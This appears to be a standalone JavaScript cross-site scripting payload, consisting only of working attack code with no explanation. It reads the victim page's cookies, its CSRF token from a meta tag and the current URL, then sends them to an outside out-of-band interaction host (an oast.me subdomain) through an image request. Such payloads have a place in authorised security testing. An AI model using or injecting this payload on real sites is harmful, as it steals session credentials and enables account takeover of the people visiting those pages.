var d=document;
var cookie=d.cookie;
var csrf=d.querySelector('meta[name=csrf-token]').content;
var url=location.href;
var data='cookie='+encodeURIComponent(cookie)+'&csrf='+encodeURIComponent(csrf)+'&url='+encodeURIComponent(url);
new Image().src='https://da5tuq8h4jp9v7dddvj03c8ekbz4wdj9h.oast.me/?'+data;
